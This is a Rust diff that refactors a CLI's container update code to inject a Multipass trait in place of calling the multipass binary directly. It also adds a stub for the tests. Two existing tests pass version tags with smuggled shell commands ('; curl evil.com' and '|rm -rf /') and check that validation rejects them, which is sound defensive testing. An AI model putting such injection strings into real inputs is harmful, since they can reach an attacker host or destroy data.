@@ -237,8 +237,7 @@ fn extract_tar_content(signed_bytes: &[u8]) -> Result<Vec<u8>> {
 
 // ── Container update flow (issue 08) ─────────────────────────────────────────
 
-/// VM name used by multipass.
-const VM_NAME: &str = "polis";
+use crate::multipass::Multipass;
 
 /// GHCR registry prefix for Polis container images.
 const GHCR_PREFIX: &str = "ghcr.io/odralabshq";
@@ -304,17 +303,13 @@ fn container_to_service_key(container_name: &str) -> &str {
 /// # Errors
 ///
 /// Returns an error if the `multipass exec` call fails unexpectedly.
-fn get_deployed_version(service_key: &str) -> Result<Option<String>> {
-    let output = std::process::Command::new("multipass")
-        .args([
-            "exec",
-            VM_NAME,
-            "--",
+fn get_deployed_version(service_key: &str, mp: &impl Multipass) -> Result<Option<String>> {
+    let output = mp
+        .exec(&[
             "yq",
             &format!(".services.{service_key}.image"),
             COMPOSE_PATH,
         ])
-        .output()
         .context("failed to run multipass exec yq")?;
 
     if !output.status.success() {
@@ -342,20 +337,11 @@ fn get_deployed_version(service_key: &str) -> Result<Option<String>> {
 /// # Errors
 ///
 /// Returns an error only if `multipass exec` itself cannot be spawned.
-fn pull_container_image(service_key: &str) -> Result<bool> {
-    let output = std::process::Command::new("multipass")
-        .args([
-            "exec",
-            VM_NAME,
-            "--",
-            "docker",
-            "compose",
-            "-f",
-            COMPOSE_PATH,
-            "pull",
-            service_key,
+fn pull_container_image(service_key: &str, mp: &impl Multipass) -> Result<bool> {
+    let output = mp
+        .exec(&[
+            "docker", "compose", "-f", COMPOSE_PATH, "pull", service_key,
         ])
-        .output()
         .context("failed to run multipass exec docker compose pull")?;
 
     Ok(output.status.success())
@@ -366,19 +352,15 @@ fn pull_container_image(service_key: &str) -> Result<bool> {
 /// # Errors
 ///
 /// Returns an error if any `multipass exec` call fails.
-fn capture_rollback_info(updates: &[ContainerUpdate]) -> Result<RollbackInfo> {
+fn capture_rollback_info(updates: &[ContainerUpdate], mp: &impl Multipass) -> Result<RollbackInfo> {
     let mut previous_refs = Vec::with_capacity(updates.len());
     for u in updates {
-        let output = std::process::Command::new("multipass")
-            .args([
-                "exec",
-                VM_NAME,
-                "--",
+        let output = mp
+            .exec(&[
                 "yq",
                 &format!(".services.{}.image", u.service_key),
                 COMPOSE_PATH,
             ])
-            .output()
             .context("failed to read current image ref for rollback")?;
 
         let image_ref = String::from_utf8_lossy(&output.stdout).trim().to_string();
@@ -392,11 +374,10 @@ fn capture_rollback_info(updates: &[ContainerUpdate]) -> Result<RollbackInfo> {
 /// # Errors
 ///
 /// Returns an error if the `yq` command fails.
-fn update_compose_tag(service_key: &str, image_ref: &str) -> Result<()> {
+fn update_compose_tag(service_key: &str, image_ref: &str, mp: &impl Multipass) -> Result<()> {
     let expr = format!(".services.{service_key}.image = \"{image_ref}\"");
-    let output = std::process::Command::new("multipass")
-        .args(["exec", VM_NAME, "--", "yq", "-i", &expr, COMPOSE_PATH])
-        .output()
+    let output = mp
+        .exec(&["yq", "-i", &expr, COMPOSE_PATH])
         .context("failed to run multipass exec yq -i")?;
 
     anyhow::ensure!(
@@ -412,23 +393,14 @@ fn update_compose_tag(service_key: &str, image_ref: &str) -> Result<()> {
 /// # Errors
 ///
 /// Returns an error if the restart command fails.
-fn restart_services(service_keys: &[&str]) -> Result<()> {
+fn restart_services(service_keys: &[&str], mp: &impl Multipass) -> Result<()> {
     let mut args = vec![
-        "exec",
-        VM_NAME,
-        "--",
-        "docker",
-        "compose",
-        "-f",
-        COMPOSE_PATH,
-        "up",
-        "-d",
+        "docker", "compose", "-f", COMPOSE_PATH, "up", "-d",
     ];
     args.extend_from_slice(service_keys);
 
-    let output = std::process::Command::new("multipass")
-        .args(&args)
-        .output()
+    let output = mp
+        .exec(&args)
         .context("failed to run multipass exec docker compose up -d")?;
 
     anyhow::ensure!(
@@ -440,10 +412,8 @@ fn restart_services(service_keys: &[&str]) -> Result<()> {
 }
 
 /// Check whether the workspace VM is running.
-fn is_vm_running() -> bool {
-    std::process::Command::new("multipass")
-        .args(["info", VM_NAME, "--format", "json"])
-        .output()
+fn is_vm_running(mp: &impl Multipass) -> bool {
+    mp.vm_info()
         .map(|o| o.status.success())
         .unwrap_or(false)
 }
@@ -453,14 +423,14 @@ fn is_vm_running() -> bool {
 /// # Errors
 ///
 /// Returns an error if any version tag in the manifest fails validation.
-fn compute_container_updates(manifest: &VersionsManifest) -> Result<Vec<ContainerUpdate>> {
+fn compute_container_updates(manifest: &VersionsManifest, mp: &impl Multipass) -> Result<Vec<ContainerUpdate>> {
     let mut updates = Vec::new();
     for (image_name, target_version) in &manifest.containers {
         validate_version_tag(target_version)
             .with_context(|| format!("invalid version tag in manifest: {target_version}"))?;
 
         let service_key = container_to_service_key(image_name).to_string();
-        let current_version = get_deployed_version(&service_key)
+        let current_version = get_deployed_version(&service_key, mp)
             .unwrap_or(None)
             .unwrap_or_else(|| "unknown".to_string());
 
@@ -481,12 +451,12 @@ fn compute_container_updates(manifest: &VersionsManifest) -> Result<Vec<Containe
 /// # Errors
 ///
 /// Returns an error if the VM is not running, any pull fails, or rollback fails.
-pub fn update_containers(manifest: &VersionsManifest, ctx: &OutputContext) -> Result<()> {
-    if !is_vm_running() {
+pub fn update_containers(manifest: &VersionsManifest, ctx: &OutputContext, mp: &impl Multipass) -> Result<()> {
+    if !is_vm_running(mp) {
         anyhow::bail!("Workspace is not running. Start it with: polis start");
     }
 
-    let updates = compute_container_updates(manifest)?;
+    let updates = compute_container_updates(manifest, mp)?;
 
     if updates.is_empty() {
         println!(
@@ -515,14 +485,14 @@ pub fn update_containers(manifest: &VersionsManifest, ctx: &OutputContext) -> Re
     }
 
     // Capture rollback info before any changes
-    let rollback = capture_rollback_info(&updates)?;
+    let rollback = capture_rollback_info(&updates, mp)?;
 
     // Pull all images first (F-002 atomicity — no compose changes until all pulls succeed)
     for u in &updates {
         if !ctx.quiet {
             println!("  Pulling {} {}...", u.image_name, u.target_version);
         }
-        if !pull_container_image(&u.service_key)? {
+        if !pull_container_image(&u.service_key, mp)? {
             println!(
                 "  Pull failed for {}:{}. No changes made.",
                 u.image_name, u.target_version
@@ -537,9 +507,9 @@ pub fn update_containers(manifest: &VersionsManifest, ctx: &OutputContext) -> Re
     let apply_result = (|| -> Result<()> {
         for u in &updates {
             let new_ref = ghcr_ref(&u.image_name, &u.target_version);
-            update_compose_tag(&u.service_key, &new_ref)?;
+            update_compose_tag(&u.service_key, &new_ref, mp)?;
         }
-        restart_services(&service_keys)
+        restart_services(&service_keys, mp)
     })();
 
     match apply_result {
@@ -552,9 +522,9 @@ pub fn update_containers(manifest: &VersionsManifest, ctx: &OutputContext) -> Re
             // Restore previous refs (F-003)
             let rollback_result = (|| -> Result<()> {
                 for (svc, prev_ref) in &rollback.previous_refs {
-                    update_compose_tag(svc, prev_ref)?;
+                    update_compose_tag(svc, prev_ref, mp)?;
                 }
-                restart_services(&service_keys)
+                restart_services(&service_keys, mp)
             })();
 
             match rollback_result {
@@ -651,7 +621,7 @@ impl UpdateChecker for GithubUpdateChecker {
 /// Returns an error if the version check, signature verification, download, or
 /// user prompt fails.
 #[allow(clippy::unused_async)] // async contract: will gain awaits when download is made async
-pub async fn run(ctx: &OutputContext, checker: &impl UpdateChecker) -> Result<()> {
+pub async fn run(ctx: &OutputContext, checker: &impl UpdateChecker, mp: &impl Multipass) -> Result<()> {
     let current = env!("CARGO_PKG_VERSION");
 
     if !ctx.quiet {
@@ -732,7 +702,7 @@ pub async fn run(ctx: &OutputContext, checker: &impl UpdateChecker) -> Result<()
         println!();
     }
     match load_versions_manifest() {
-        Ok(manifest) => update_containers(&manifest, ctx)?,
+        Ok(manifest) => update_containers(&manifest, ctx, mp)?,
         Err(e) => {
             // Non-fatal: container update check failure should not block CLI update
             eprintln!("  Warning: could not load versions manifest: {e}");
@@ -933,6 +903,26 @@ mod tests {
     use super::*;
     use proptest::prelude::*;
 
+    /// Stub [`Multipass`] for tests that never reach multipass calls.
+    struct StubMultipass;
+    impl Multipass for StubMultipass {
+        fn vm_info(&self) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: vm_info not expected")
+        }
+        fn launch(&self, _: &str, _: &str, _: &str, _: &str) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: launch not expected")
+        }
+        fn start(&self) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: start not expected")
+        }
+        fn transfer(&self, _: &str, _: &str) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: transfer not expected")
+        }
+        fn exec(&self, _: &[&str]) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: exec not expected")
+        }
+    }
+
     // -----------------------------------------------------------------------
     // parse_release_notes — unit
     // -----------------------------------------------------------------------
@@ -1024,7 +1014,7 @@ mod tests {
         }
 
         let ctx = OutputContext::new(true, true);
-        let result = run(&ctx, &AlwaysUpToDate).await;
+        let result = run(&ctx, &AlwaysUpToDate, &StubMultipass).await;
         assert!(result.is_ok());
     }
 
@@ -1050,7 +1040,7 @@ mod tests {
         }
 
         let ctx = OutputContext::new(true, true);
-        let result = run(&ctx, &BadSignature).await;
+        let result = run(&ctx, &BadSignature, &StubMultipass).await;
         assert!(result.is_err());
         assert!(
             result.unwrap_err().to_string().contains("signature"),
@@ -1113,7 +1103,7 @@ mod tests {
 
             let ctx = crate::output::OutputContext::new(true, true);
             let rt = tokio::runtime::Runtime::new().expect("runtime");
-            let result = rt.block_on(run(&ctx, &UpToDate));
+            let result = rt.block_on(run(&ctx, &UpToDate, &StubMultipass));
             prop_assert!(result.is_ok(), "expected Ok for version {version}");
         }
 
@@ -1139,7 +1129,7 @@ mod tests {
 
             let ctx = crate::output::OutputContext::new(true, true);
             let rt = tokio::runtime::Runtime::new().expect("runtime");
-            let result = rt.block_on(run(&ctx, &BadSig));
+            let result = rt.block_on(run(&ctx, &BadSig, &StubMultipass));
             prop_assert!(result.is_err());
             prop_assert!(
                 result.unwrap_err().to_string().contains("signature"),
@@ -1483,7 +1473,7 @@ mod tests {
     fn test_compute_container_updates_invalid_tag_returns_error() {
         // V-004: invalid version tag must be rejected before any multipass call
         let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.1; curl evil.com")]);
-        let result = compute_container_updates(&manifest);
+        let result = compute_container_updates(&manifest, &StubMultipass);
         assert!(result.is_err(), "invalid tag must return error");
         assert!(
             result.unwrap_err().to_string().contains("invalid version tag"),
@@ -1495,13 +1485,13 @@ mod tests {
     fn test_compute_container_updates_injection_tag_returns_error() {
         // V-004: shell metacharacter in tag
         let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.0|rm -rf /")]);
-        assert!(compute_container_updates(&manifest).is_err());
+        assert!(compute_container_updates(&manifest, &StubMultipass).is_err());
     }
 
     #[test]
     fn test_compute_container_updates_no_v_prefix_returns_error() {
         let manifest = manifest_with_containers(&[("polis-gate-oss", "0.3.0")]);
-        assert!(compute_container_updates(&manifest).is_err());
+        assert!(compute_container_updates(&manifest, &StubMultipass).is_err());
     }
 
     // -----------------------------------------------------------------------
